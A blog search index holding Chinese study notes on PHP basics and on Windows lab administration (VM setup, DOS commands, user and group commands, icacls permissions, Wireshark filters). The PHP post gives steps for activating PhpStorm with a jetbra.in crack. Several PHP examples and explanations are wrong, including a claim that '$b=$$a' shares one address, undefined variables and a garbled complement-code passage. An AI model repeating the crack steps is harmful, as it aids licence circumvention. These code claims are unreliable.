<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Php</title>
      <link href="/2025/09/13/Php/"/>
      <url>/2025/09/13/Php/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><pre><code class="hljs bash"><span class="hljs-comment"># PHP是一种运行在服务器端的脚步语言，可以嵌入到HTML中。是一中面向对象的、解释的。7.3版本比较好用</span><span class="hljs-comment"># 1994年</span></code></pre><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><pre><code class="hljs bash"><span class="hljs-comment"># 安装 PhpStorm</span><span class="hljs-comment"># https://3.jetbra.in/ 下载安装包 jetbra.zip 解压后放在 PhpStorm 的bin目录下, 为 jetbra 目录</span><span class="hljs-comment"># 双击 \bin\jetbra\scripts\install-all-users.vbs</span><span class="hljs-comment"># 打开 PhpStorm, 在 https://3.jetbra.in/ 拷贝激活码到激活窗口。</span><span class="hljs-comment"># 如下图配置PHP解析器</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250913234353519.png" alt="img"></p><h2 id="PHP-基础"><a href="#PHP-基础" class="headerlink" title="PHP 基础"></a>PHP 基础</h2><h3 id="PHP代码标记"><a href="#PHP代码标记" class="headerlink" title="PHP代码标记"></a>PHP代码标记</h3><pre><code class="hljs php"><span class="hljs-comment">// 第一种: ASP 标记</span>&lt;% php代码 %&gt;<span class="hljs-comment">// 第二种: 短标记</span>    <span class="hljs-meta">&lt;?</span> php代码 <span class="hljs-meta">?&gt;</span><span class="hljs-comment">// 第三种: 脚步标记</span>    &lt;scrip language=<span class="hljs-string">&quot;php&quot;</span>&gt; php 代码 &lt;/scrip&gt;<span class="hljs-comment">// 第四种: 标准标记 (目前常用)</span>    <span class="hljs-meta">&lt;?php</span>        php代码;    <span class="hljs-meta">?&gt;</span>        <span class="hljs-comment">// 如果是单独的 php 文档，习惯不闭合</span>        <span class="hljs-comment">// 例如</span>        <span class="hljs-meta">&lt;?php</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello world&quot;</span>;<span class="hljs-comment">// 如果是嵌入在html代码中，则需闭合(写在PHP文档中)</span>        language-php复制代码</code></pre><h3 id="PHP-注释"><a href="#PHP-注释" class="headerlink" title="PHP 注释"></a>PHP 注释</h3><pre><code class="hljs php"><span class="hljs-comment"># 这是一个单行注释的例子</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello world&quot;</span>; <span class="hljs-comment"># 这也是一个单行注释，跟在代码后面</span><span class="hljs-comment">/*</span><span class="hljs-comment">这个是多行注释的例子</span><span class="hljs-comment">*/</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello word&quot;</span>; <span class="hljs-comment">/* 这个注释可以跨行</span><span class="hljs-comment">  * 多行*/</span>language-php复制代码</code></pre><h3 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h3><pre><code class="hljs php"><span class="hljs-comment"># PHP使用 $ 来声明变量</span><span class="hljs-meta">&lt;?php</span>    <span class="hljs-variable">$var</span>=<span class="hljs-number">1</span>; <span class="hljs-comment">// 声明变量</span>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$var</span>; <span class="hljs-comment">// 访问变量</span>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$var</span>); <span class="hljs-comment">// 删除变量</span>language-php复制代码</code></pre><h3 id="PHP预定变量"><a href="#PHP预定变量" class="headerlink" title="PHP预定变量"></a>PHP预定变量</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-comment">// 预定义变量</span>  <span class="hljs-comment">// 获取所有get提交表单</span>  <span class="hljs-variable">$_GET</span>; <span class="hljs-comment">// 获取所以表单以get方式提交的数据</span>  <span class="hljs-variable">$_POST</span>; <span class="hljs-comment">// POST 提交的数据都会保存在这里</span>  <span class="hljs-variable">$_REQUEST</span>; <span class="hljs-comment">// GET和POST 提交的都会保存</span>  <span class="hljs-variable">$GLOBALS</span>; <span class="hljs-comment">// PHP 中所有的全局变量</span>  <span class="hljs-variable">$_SERVER</span>; <span class="hljs-comment">// 服务器信息</span>  <span class="hljs-variable">$_SESSION</span>; <span class="hljs-comment">// session 会话数据</span>  <span class="hljs-variable">$_COOKIE</span>; <span class="hljs-comment">// cookie 会话数据</span>  <span class="hljs-variable">$_ENV</span>; <span class="hljs-comment">// 环境信息</span>  <span class="hljs-variable">$_FILES</span>; <span class="hljs-comment">// 用户上传的文件信息</span>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;  <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SERVER</span>); <span class="hljs-comment">// 打印</span>language-php复制代码</code></pre><h3 id="PHP-可变变量"><a href="#PHP-可变变量" class="headerlink" title="PHP 可变变量"></a>PHP 可变变量</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;b&#x27;</span>;  <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;bb&#x27;</span>;  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$$a</span>; <span class="hljs-comment">// bb</span>language-php复制代码</code></pre><h3 id="PHP-变量传值"><a href="#PHP-变量传值" class="headerlink" title="PHP 变量传值"></a>PHP 变量传值</h3><pre><code class="hljs php"><span class="hljs-comment">// 变量传递</span><span class="hljs-comment">// 值传递</span><span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$b</span>=<span class="hljs-variable">$$a</span>;<span class="hljs-comment">// 上述a和b都指向一个地址，修改任意一个变量，另外一个都会改变。</span>language-php复制代码</code></pre><h3 id="PHP常量"><a href="#PHP常量" class="headerlink" title="PHP常量"></a>PHP常量</h3><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PI</span>=<span class="hljs-number">3.14</span>;<span class="hljs-keyword">echo</span> PI;<span class="hljs-comment">// 系统常量</span><span class="hljs-keyword">echo</span> PHP_VERSION;<span class="hljs-keyword">echo</span> PHP_INT_SIZE;<span class="hljs-keyword">echo</span> PHP_INT_MAX;<span class="hljs-comment">// 系统魔术常量</span><span class="hljs-keyword">echo</span> <span class="hljs-keyword">__DIR__</span>; <span class="hljs-comment"># 绝对路径</span><span class="hljs-keyword">echo</span> <span class="hljs-keyword">__FILE__</span>; <span class="hljs-comment"># 当前文件的绝对路径</span><span class="hljs-keyword">echo</span> <span class="hljs-keyword">__LINE__</span>; <span class="hljs-comment"># 当前行数</span>language-php复制代码</code></pre><h3 id="PHP数据类型"><a href="#PHP数据类型" class="headerlink" title="PHP数据类型"></a>PHP数据类型</h3><pre><code class="hljs php"><span class="hljs-comment">## 共三大类八小类。</span><span class="hljs-comment"># 简单（基本）数据类型：4个小类。整型(int/integer)、浮点型、字符串型、布尔型</span><span class="hljs-comment"># 复合数据类型：2个小类。对象、数组</span><span class="hljs-comment"># 特殊数据类型：2个小类。资源类型(resource:php外部数据,数据库,文件)、空类型 NULL（不能运算）</span><span class="hljs-comment">## 简单（基本）数据类型</span><span class="hljs-comment"># 整型 int/integer</span><span class="hljs-variable">$a1</span>=<span class="hljs-number">110</span>; <span class="hljs-comment">// 10进制</span><span class="hljs-variable">$a2</span>=<span class="hljs-number">0b110</span>; <span class="hljs-comment">// 2进制</span><span class="hljs-variable">$a3</span>=<span class="hljs-number">0110</span>; <span class="hljs-comment">// 8 进制</span><span class="hljs-variable">$a4</span>=<span class="hljs-number">0x110</span>; <span class="hljs-comment">// 16进制</span><span class="hljs-comment"># 浮点型</span><span class="hljs-variable">$f1</span>=<span class="hljs-number">1.23</span>;<span class="hljs-variable">$f2</span>=<span class="hljs-number">1.23e10</span>; <span class="hljs-comment">// 科学计数法</span><span class="hljs-comment"># 字符串型</span><span class="hljs-variable">$s</span>=<span class="hljs-string">&#x27;mz&#x27;</span>;<span class="hljs-comment"># 布尔型 bool/boolean</span><span class="hljs-variable">$a</span>=<span class="hljs-literal">true</span>;<span class="hljs-variable">$b</span>=<span class="hljs-literal">false</span>;<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>); <span class="hljs-comment">// 判断数据类型</span><span class="hljs-comment"># empty()</span><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;&#x27;</span>; <span class="hljs-comment">// true</span><span class="hljs-variable">$b</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment">// true</span><span class="hljs-variable">$c</span>=<span class="hljs-number">111</span>; <span class="hljs-comment">// false</span><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>)); <span class="hljs-comment">// false</span><span class="hljs-comment">## 复合数据类型</span><span class="hljs-comment"># 对象</span><span class="hljs-comment"># 数组</span><span class="hljs-comment">## 特殊数据类型</span><span class="hljs-comment"># 资源类型</span><span class="hljs-comment"># 空类型</span>language-php复制代码</code></pre><p>PHP强制数据类型转换</p><pre><code class="hljs php"><span class="hljs-variable">$s</span>=<span class="hljs-string">&#x27;1&#x27;</span>;<span class="hljs-title function_ invoke__">var_dump</span>((<span class="hljs-keyword">float</span>)<span class="hljs-variable">$s1</span>);<span class="hljs-title function_ invoke__">var_dump</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$s1</span>);<span class="hljs-variable">$x</span>=<span class="hljs-string">&#x27;abc1.1.1&#x27;</span>;<span class="hljs-variable">$x2</span>=<span class="hljs-string">&#x27;l.1.1abc&#x27;</span>;<span class="hljs-title function_ invoke__">var_dump</span>((<span class="hljs-keyword">float</span>)$<span class="hljs-number">1</span>); <span class="hljs-comment">// 0</span><span class="hljs-title function_ invoke__">var_dump</span>((<span class="hljs-keyword">float</span>)$<span class="hljs-number">2</span>); <span class="hljs-comment">// 1.1</span>language-php复制代码</code></pre><p>PHP类型判断</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-comment">// 创建数据</span>    <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;abc1.1.1&#x27;</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;1.1.1abc&#x27;</span>;;<span class="hljs-variable">$c</span>=<span class="hljs-number">1</span>;<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_int</span>(<span class="hljs-variable">$a</span>)); <span class="hljs-comment">// false</span><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$a</span>)); <span class="hljs-comment">// true</span><span class="hljs-comment">// 获取数据类型 gettype()</span><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">// string</span><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$c</span>); <span class="hljs-comment">// integer</span><span class="hljs-comment">// 设置数据类型 settype()</span><span class="hljs-title function_ invoke__">settype</span>(<span class="hljs-variable">$a</span>, <span class="hljs-string">&#x27;int&#x27;</span>);<span class="hljs-title function_ invoke__">var_dum</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">// string -&gt; int</span>language-php复制代码</code></pre><h3 id="PHP-运算符"><a href="#PHP-运算符" class="headerlink" title="PHP 运算符"></a>PHP 运算符</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// 连接运算符 . 或者 .=</span>    <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;whoami&#x27;</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;007&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>; <span class="hljs-comment">// whoami007</span><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.=<span class="hljs-variable">$b</span>; <span class="hljs-comment">// whoami007</span>            <span class="hljs-comment">// 错误抑制符 @</span>    <span class="hljs-variable">$a</span>=<span class="hljs-number">11</span>;<span class="hljs-variable">$b</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$c</span>=@(<span class="hljs-variable">$a</span>/<span class="hljs-variable">$b</span>); <span class="hljs-comment">// @在前面就不会报错了</span><span class="hljs-comment">// 三目运算符</span>表达式<span class="hljs-number">1</span> ? 表达式<span class="hljs-number">2</span>: 表达式<span class="hljs-number">3</span>;<span class="hljs-comment">// 自操作运算</span><span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$a</span>++; <span class="hljs-comment">//2</span>++<span class="hljs-variable">$a</span>; <span class="hljs-comment">//3</span><span class="hljs-variable">$b</span>=<span class="hljs-variable">$a</span>++; <span class="hljs-comment">// b=3,a=4</span><span class="hljs-comment">// 计算机码</span><span class="hljs-comment">// 系统中存在两个0: +0 和 -0</span>+<span class="hljs-number">0</span>:原码 <span class="hljs-number">00000000</span>         反码 <span class="hljs-number">00000000</span>         补码 <span class="hljs-number">00000000</span>    -<span class="hljs-number">0</span>:原码 <span class="hljs-number">10000000</span>         反码 <span class="hljs-number">11111111</span> <span class="hljs-comment">// 反码: 针对负数，符号位不变，其他位取反</span>         补码 <span class="hljs-number">00000000</span> <span class="hljs-comment">// 补码: 反码+1</span>language-php复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows</title>
      <link href="/2025/08/24/Windows/"/>
      <url>/2025/08/24/Windows/</url>
      
        <content type="html"><![CDATA[<h1 id="Windosw7"><a href="#Windosw7" class="headerlink" title="Windosw7"></a>Windosw7</h1><h2 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h2><pre><code class="hljs bash"><span class="hljs-comment"># VM16pro，安装系统2C4G60G，删除打印机，工作网络，稍后提示，mz/aa</span>Windows7 企业版<span class="hljs-comment"># 安装VM Tools工具的补丁</span>windows6.1-kb4474419-v3-x64_b5614c6cea5cb4e198717789633dca16308ef79c.msu<span class="hljs-comment"># 禁用 Windows update</span>services.msc启动类型：禁用；恢复：无操作<span class="hljs-comment"># 关闭 配置自动更新</span>gpedit.msc管理模版 &gt; Windows组件 &gt; Windows Uupdate &gt;&gt; 配置自动更新 （已禁用）<span class="hljs-comment"># 关闭防火墙</span>控制面板\系统和安全\Windows 防火墙\自定义设置<span class="hljs-comment"># 压缩出一个D盘30G左右</span><span class="hljs-comment"># 克隆多一台WIn7虚拟机，并修改主机名mz-PC2</span></code></pre><hr><h1 id="Windows-Server-2019"><a href="#Windows-Server-2019" class="headerlink" title="Windows Server 2019"></a>Windows Server 2019</h1><h2 id="虚拟机安装-1"><a href="#虚拟机安装-1" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h2><pre><code class="hljs bash"><span class="hljs-comment"># 桌面体验版，30G系统盘，aA1234</span>D潘<span class="hljs-comment"># 桌面优化</span>图标<span class="hljs-comment"># VMTools</span>安装 VMTools<span class="hljs-comment"># 关闭防火墙</span>控制面板\系统和安全\Windows 防火墙\自定义设置<span class="hljs-comment"># 关闭更新</span>gpedit.msc管理模版 &gt; Windows组件 &gt; Windows Uupdate &gt;&gt; 配置自动更新 （已禁用）<span class="hljs-comment"># 无须按 Ctrl + Alt + Del交互式登录</span>gpedit.msc &gt; Windows设置 &gt; 安全设置 &gt; 本地策略 &gt; 安全选项 &gt; 交互式登陆：无须按Ctrl + Alt + Del （已启用）<span class="hljs-comment"># 快照</span><span class="hljs-comment"># 克隆&amp;修改主机名</span></code></pre><hr><h1 id="Dos命令"><a href="#Dos命令" class="headerlink" title="Dos命令"></a>Dos命令</h1><h2 id="文件-目录"><a href="#文件-目录" class="headerlink" title="文件&amp;目录"></a>文件&amp;目录</h2><h3 id="dir-查看目录文件"><a href="#dir-查看目录文件" class="headerlink" title="dir 查看目录文件"></a>dir 查看目录文件</h3><pre><code class="hljs bat"><span class="hljs-built_in">dir</span> # 查看当前目录文件<span class="hljs-built_in">dir</span> /w # 只显示名字<span class="hljs-built_in">dir</span> /s # 显示当前目录和子目录的所以文件dis /a # 也显示隐藏文件<span class="hljs-built_in">dir</span> /s /p # 显示当前目录和子目录的所以文件 / 翻页language-bat复制代码</code></pre><h3 id="md-创建目录"><a href="#md-创建目录" class="headerlink" title="md 创建目录"></a>md 创建目录</h3><pre><code class="hljs bat"><span class="hljs-built_in">md</span> test # 创建test目录<span class="hljs-built_in">md</span> a/b/c # 创建a/b/c多层目录<span class="hljs-built_in">md</span> public jishubu caiwubu xiaoshoubu # 批量创建四个目录language-bat复制代码</code></pre><h3 id="cd-进入目录"><a href="#cd-进入目录" class="headerlink" title="cd 进入目录"></a>cd 进入目录</h3><pre><code class="hljs bat"><span class="hljs-built_in">cd</span> <span class="hljs-built_in">path</span> # 进入目录<span class="hljs-built_in">cd</span> / # 返回盘根目录<span class="hljs-built_in">cd</span> /d [盘符]:/<span class="hljs-built_in">path</span> # 直接跨盘符调整指定目录 language-bat复制代码</code></pre><h3 id="rd-删除目录"><a href="#rd-删除目录" class="headerlink" title="rd 删除目录"></a>rd 删除目录</h3><pre><code class="hljs bat"><span class="hljs-built_in">rd</span> /s test # 删除 test目录[需要确认]<span class="hljs-built_in">rd</span> /s/q a\b\c # 确定删除a\b\c目录[不用一个一个交互式确认删除]<span class="hljs-built_in">rd</span> public jishubu caiwubu xiaoshoubu # 批量删除四个目录language-bat复制代码</code></pre><h3 id="cd-创建文件"><a href="#cd-创建文件" class="headerlink" title="cd&gt; 创建文件"></a>cd&gt; 创建文件</h3><pre><code class="hljs bat"><span class="hljs-built_in">cd</span>&gt; aa.txt # 创建aa.txt文件<span class="hljs-built_in">cd</span>&gt; a\aa.txt # 在a路径下创建aa.txt文件language-bat复制代码</code></pre><h3 id="echo-输入文件内容"><a href="#echo-输入文件内容" class="headerlink" title="echo 输入文件内容"></a>echo 输入文件内容</h3><pre><code class="hljs bat"><span class="hljs-built_in">echo</span> whoami &gt; aa.txt # 往aa.txt文件覆盖写入内容whoami<span class="hljs-built_in">echo</span> whoami &gt;&gt; aa.txt # 往aa.txt文件追加写入内容whoami<span class="hljs-built_in">echo</span> whoami &gt; a\aa.txt # 往a目录下的aa.txt文件覆盖写入内容whoamilanguage-bat复制代码</code></pre><h3 id="type-查看文件内容"><a href="#type-查看文件内容" class="headerlink" title="type 查看文件内容"></a>type 查看文件内容</h3><pre><code class="hljs bat"><span class="hljs-built_in">type</span> aa.txt # 查看aa.txt文件内容language-bat复制代码</code></pre><h3 id="del-删除文件"><a href="#del-删除文件" class="headerlink" title="del 删除文件"></a>del 删除文件</h3><pre><code class="hljs bat"><span class="hljs-built_in">del</span> aa.txt # 删除 aa.txt 文件language-bat复制代码</code></pre><h3 id="copy-复制文件"><a href="#copy-复制文件" class="headerlink" title="copy 复制文件"></a>copy 复制文件</h3><pre><code class="hljs bat"><span class="hljs-built_in">copy</span> aa.txt test # 将aa.txt文件拷贝到test目录中<span class="hljs-built_in">copy</span> test\aa.txt bb.txt # 拷贝test目录下的aa.txt文件到根目录并修改为bb.txt文件language-bat复制代码</code></pre><h3 id="ren-修改文件名"><a href="#ren-修改文件名" class="headerlink" title="ren 修改文件名"></a>ren 修改文件名</h3><pre><code class="hljs bat"><span class="hljs-built_in">ren</span> bb.txt cc.txt # 将 bb.txt 修改为 cc.txt<span class="hljs-built_in">ren</span> test\aa.txt bb.txt # 将test目录下的aa.txt 修改为bb.txt [后面不需要指定目录]language-bat复制代码</code></pre><h2 id="用户-组"><a href="#用户-组" class="headerlink" title="用户&amp;组"></a>用户&amp;组</h2><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><pre><code class="hljs bat"># <span class="hljs-number">1</span>、查看用户whoami /user # 查看当前用户vmic useraccount get name,sid # 查看所以账号的名称和sid<span class="hljs-built_in">net</span> user  # 查看所有用户<span class="hljs-built_in">net</span> user admin # 查看admin用户信息# <span class="hljs-number">2</span>、启用或禁用指定用户<span class="hljs-built_in">net</span> user admin /active:yes # 启用admin用户<span class="hljs-built_in">net</span> user admin /active:no #  禁用admin用户# <span class="hljs-number">3</span>、命令创建用户<span class="hljs-built_in">net</span> user mz aa123456 /add  # 创建用户mz 密码为aa123456# <span class="hljs-number">4</span>、命令重置用户密码<span class="hljs-built_in">net</span> user mz &quot;&quot; # 将mz用户密码重置为空# <span class="hljs-number">5</span>、修改用户密码<span class="hljs-built_in">net</span> user mz <span class="hljs-number">123456</span> # 将mz用户的密码修改为<span class="hljs-number">123456</span># <span class="hljs-number">6</span>、命令删除用户<span class="hljs-built_in">net</span> user mz /<span class="hljs-built_in">del</span> # 删除mz用户language-bat复制代码</code></pre><h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><pre><code class="hljs bat"># <span class="hljs-number">1</span>、查看本地用户组<span class="hljs-built_in">net</span> localgroup # <span class="hljs-number">2</span>、命令创建 group1 组<span class="hljs-built_in">net</span> localgroup group1 /add# <span class="hljs-number">3</span>、命令删除 group1 组<span class="hljs-built_in">net</span> localgroup group1 /<span class="hljs-built_in">del</span># <span class="hljs-number">4</span>、命令添加 mz 用户到指定 group1 组<span class="hljs-built_in">net</span> localgroup group1 mz /add# <span class="hljs-number">5</span>、把指定 mz用户踢出 group1 组<span class="hljs-built_in">net</span> localgroup group1 mz /<span class="hljs-built_in">del</span>language-bat复制代码</code></pre><h2 id="文件系统-权限"><a href="#文件系统-权限" class="headerlink" title="文件系统&amp;权限"></a>文件系统&amp;权限</h2><h3 id="文件系统-权限-1"><a href="#文件系统-权限-1" class="headerlink" title="文件系统&amp;权限"></a>文件系统&amp;权限</h3><pre><code class="hljs bash">Windowe系统格式：CDFS/UDF/FAT12/FAT16/FAT32/NTFSNTFS (New Technology File System 新技术文件系统)默认继承权限；可以通过禁用继承，修改权限和主体；aa/bb: 如果aa禁用了继承，并修改权限；bb没有禁用继承，则bb会继承aa的权限；cc/dd：如果<span class="hljs-built_in">dd</span>禁用了继承，并修改权限；cc没有禁用继承，<span class="hljs-built_in">dd</span>的权限保持不变；复制代码</code></pre><h3 id="icacls-命令"><a href="#icacls-命令" class="headerlink" title="icacls 命令"></a>icacls 命令</h3><pre><code class="hljs bat">## icacls &quot;目录路径&quot; [/参数] [用户/组:权限] [/选项]#目录路径：需操作的目标目录（含空格时需用引号包裹）。#参数：控制操作类型（如 /grant、/deny、/remove）。#用户/组：指定权限对象（支持友好名称或 SID 格式，如 Administrators 或 *S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">544</span>）。#权限：定义访问权限（如 F 完全控制、M 修改、RX 读取执行）。#选项：控制操作范围（如 /T 递归、/C 继续错误、/Q 静默模式）。# (I)(OI)(CI)(F)： 继承父目录权限，且对子文件（OI）和子文件夹（CI）生效## <span class="hljs-number">1</span>、查看当前权限icacls &quot;C:\Data&quot;## <span class="hljs-number">2</span>、修改权限# 授予权限：为 Users 组授予目录及其子项的读取和执行权限（/T 递归生效）。icacls &quot;C:\Data&quot; /grant &quot;Users&quot;:(RX) /T# 拒绝权限：显式拒绝 Guest 用户对目录的写入权限（优先于其他权限）。icacls &quot;C:\Data&quot; /deny &quot;Guest&quot;:(W)# 删除权限：从 ACL 中移除 Everyone 组的所有权限条目。icacls &quot;C:\Data&quot; /remove &quot;Everyone&quot;## <span class="hljs-number">3</span>、继承权限# 禁用继承并移除继承权限：目录将不再继承父目录权限，并删除所有已继承的权限条目。icacls &quot;C:\Data&quot; /inheritance:r# 禁用继承但保留权限：恢复继承父目录权限的设置。icacls &quot;C:\Data&quot; /inheritance:d## <span class="hljs-number">4</span>、备份与恢复权限# 备份 ACL 到文件：将目录及其子项的 ACL 保存到文本文件，供后续恢复使用。icacls &quot;C:\Data&quot; /save &quot;C:\Backup\Data_ACL.txt&quot; /T# 从文件恢复 ACL：恢复目录及其子项的 ACL 为备份时的状态。icacls &quot;C:\Data&quot; /<span class="hljs-built_in">restore</span> &quot;C:\Backup\Data_ACL.txt&quot;## <span class="hljs-number">5</span>、重置权限为默认继承# 删除所有显式设置的权限，恢复为父目录的继承设置（慎用，可能导致权限丢失）。icacls &quot;C:\Data&quot; /reset /T## 典型应用&#123;&quot;OI,CI&quot;: &quot;影响未来子文件和目录&quot;, &quot;RWD&quot;: &quot;不可以执行和修改权限其他都可&quot;, &quot;/T&quot;: &quot;需要递归现存的子孙文件和目录&quot;&#125;icacls &quot;public&quot; /inheritance:r /grant &quot;owner&quot;:(OI)(CI)(F) /grant &quot;admin&quot;:(OI)(CI)(M|[RX,W,D]) /grant &quot;group_rwd&quot;:(OI)(CI)(R,W,D) /grant &quot;group_rx&quot;:(OI)(CI)(RX) /grant &quot;group_r&quot;:(OI)(CI)(R) /Tlanguage-bat复制代码</code></pre><h3 id="权限掩码说明"><a href="#权限掩码说明" class="headerlink" title="权限掩码说明"></a><strong>权限掩码说明</strong></h3><table><thead><tr><th align="left">权限</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>F</code></td><td align="left">完全控制（Full Control）：包含所有其他权限（<code>M</code> + <code>RX</code> + <code>W</code> + <code>D</code> + <code>WDAC</code>）</td></tr><tr><td align="left"><code>M</code></td><td align="left">修改（Modify）：<code>RX</code> + <code>W</code> + <code>D</code>（可读写、执行、删除，但<strong>不能更改权限或所有者</strong>）。</td></tr><tr><td align="left"><code>RX</code></td><td align="left">读取和执行（Read and Execute）：<code>R</code> + 执行权限（对目录需遍历权限）&amp; 执行程序</td></tr><tr><td align="left"><code>R</code></td><td align="left">只读（Read-only）：查看文件内容 &amp; 列出目录内容</td></tr><tr><td align="left"><code>W</code></td><td align="left">只写（Write-only）：修改文件内容 &amp; 创建新文件</td></tr><tr><td align="left"><code>D</code></td><td align="left">删除（Delete）：删除 &amp; 重命名文件（需同时有 <code>W</code> 权限）</td></tr><tr><td align="left"><code>WDAC</code></td><td align="left">写入 DAC（Write Data Access Control List）：允许修改文件的 <strong>安全描述符</strong>（即 ACL 本身）</td></tr><tr><td align="left"><strong><code>OI</code></strong></td><td align="left">子文件（子对象）&#x2F; <strong>不递归</strong> &#x2F; 影响指定的目录及其<strong>未来子项（动态继承）</strong></td></tr><tr><td align="left"><strong><code>CI</code></strong></td><td align="left">子文件夹（容器）&#x2F; <strong>不递归</strong> &#x2F; 影响指定的目录及其<strong>未来子项（动态继承）</strong></td></tr><tr><td align="left"><strong><code>/T</code></strong></td><td align="left">目录及所有子项 &#x2F; <strong>递归</strong> &#x2F; 影响当前目录及所有<strong>现有子项（静态修改）</strong></td></tr><tr><td align="left"><strong><code>GR</code></strong></td><td align="left"><strong>通用读取</strong>：允许用户查看目录内容或文件内容，但不允许修改或执行</td></tr><tr><td align="left"><strong><code>GE</code></strong></td><td align="left"><strong>通用执行</strong>：允许用户运行可执行文件或访问目录中的子内容</td></tr><tr><td align="left"><strong><code>IO</code></strong></td><td align="left">**（更推荐用<code>/inheritance</code>）**仅继承：当需要确保某个权限仅对子对象生效，而不对父目录本身生效时使用</td></tr><tr><td align="left">I</td><td align="left">继承权限（只读）：查看权限时标识继承状态</td></tr></tbody></table><h2 id="Wireshark-抓包工具"><a href="#Wireshark-抓包工具" class="headerlink" title="Wireshark 抓包工具"></a>Wireshark 抓包工具</h2><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250829114043399.png" alt="抓包"></p><p>抓包</p><pre><code class="hljs bash">1: 开始抓包2: 停止抓包3: 重新抓包4：捕获过滤器：抓包前设置16: 着色规则<span class="hljs-comment"># </span>显示过滤器: 分析 &gt; 显示过滤器。可以添加过滤条件</code></pre><h3 id="过滤使用"><a href="#过滤使用" class="headerlink" title="过滤使用"></a>过滤使用</h3><pre><code class="hljs bash">ip.addr==10.10.11.148tpcudphttp<span class="hljs-comment">## 捕获过滤器 (抓包前，输入的条件要是绿色才可以)</span>ip host 192.168.16.100 and icmp<span class="hljs-comment"># 协议</span>tcpicmp<span class="hljs-comment"># ip 过滤</span>host 192.168.16.100 <span class="hljs-comment"># 源目的</span>src host 192.168.16.100 <span class="hljs-comment"># 源</span>dst host 192.168.16.100 <span class="hljs-comment"># 目的</span><span class="hljs-comment"># port 过滤</span>port 443src port 443dst port 443<span class="hljs-comment"># 一起使用</span><span class="hljs-comment"># and | &amp;&amp; 两个参数都可以</span><span class="hljs-comment"># or | ||</span><span class="hljs-comment"># !</span>src host 192.168.16.100 &amp;&amp; dst port 443!broadcast <span class="hljs-comment"># 非广播</span><span class="hljs-comment">## 搜索栏过滤</span>icmp<span class="hljs-comment"># ip</span>ip.addr==192.168.16.100ip.src==192.168.16.100ip.dst==192.168.16.100tcp.port==443udp.port=443tcp.srcport=443tcp.dstport=443<span class="hljs-comment"># 方法</span>http.request.method==GEThttp.request.method==POSTip.addr==192.168.16.100 and icmpip.addr==192.168.16.100 or icmp<span class="hljs-comment">## 将抓包内容作为过滤条件应用</span></code></pre><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><pre><code class="hljs bat"><span class="hljs-built_in">cls</span> # 清屏<span class="hljs-built_in">ver</span> # 查看当前dos版本<span class="hljs-built_in">chkdsk</span> # 检查当前磁盘，<span class="hljs-built_in">chkdsk</span> d: 检查D盘<span class="hljs-built_in">time</span> # 显示时间<span class="hljs-built_in">date</span> # 显示日期certmgr # 证书管理窗口mstsc # 打开远程窗口explorer # 文件管理器calc # 计时器工具cleanmgr # 磁盘清理工具gpedit # 本地组策略编辑器lusrmgr # 本地用户和组notepad # 打开记事本regedit # 注册表sfc # 检查文件， sfc /SCANNOW taskmgr # 任务管理器write # 